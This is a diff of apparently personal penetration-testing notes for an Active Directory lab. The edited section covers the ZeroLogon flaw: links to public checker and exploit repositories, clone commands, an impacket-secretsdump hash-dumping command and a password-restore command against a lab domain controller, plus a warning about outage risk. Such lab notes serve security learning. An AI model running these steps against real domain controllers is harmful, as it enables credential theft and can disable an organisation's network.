@@ -463,13 +463,13 @@ It is worth checking for these additional vulnerabilities, **but I should not at
 
 - ZeroLogon
 
-It is a really critical bug. This attack allows the account password to be reset. As a result of this attack, I can obtain the `NTDS.DIT` dumping without knowing the password of the Domain Controller (DC).
+It is a really critical bug. This attack allows the dc admin account password to be reset. As a result of this attack, attackers can obtain the `NTDS.DIT` dumping without knowing the password of the Domain Controller (DC).
 
 https://github.com/SecuraBV/CVE-2020-1472 - for checking if the target machine is vulnerable to this attack
 
-https://github.com/dirkjanm/CVE-2020-1472 - for exploitation and restore the password
+https://github.com/dirkjanm/CVE-2020-1472 - for exploitation and restoration of the password
 
-As this attack is extremely dangerous, I need to consider the potential impact on the network if a DC goes down, what the consequences would be if clients are unable to restore the DC to a working state, and finally, whether demonstrating the exploit is worth the risk.
+As this attack is extremely dangerous, I need to consider the potential impact on the network if a DC server goes down, what the consequences would be if clients are unable to restore the DC to a working state, and finally, whether demonstrating the exploit is worth the risk.
 
 1. `git clone https://github.com/dirkjanm/CVE-2020-1472.git`
    `git clone https://github.com/SecuraBV/CVE-2020-1472.git`
@@ -488,7 +488,7 @@ Then exploit.
 
 Hashes will be dumped.
 
-Try to restore.
+Restore this server!
 
 5. `impacket-secretsdump administrator@192.168.64.32 -hashes $(dumped hashes)`
 
@@ -498,7 +498,7 @@ And then copy the `$(plain_password_hex)`
 
 6. `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.64.32 -hexpass $(plain_password_hex)`
 
-This command is to change the password.
+This command is to restore the password.
 
 - PrintNightmare
 
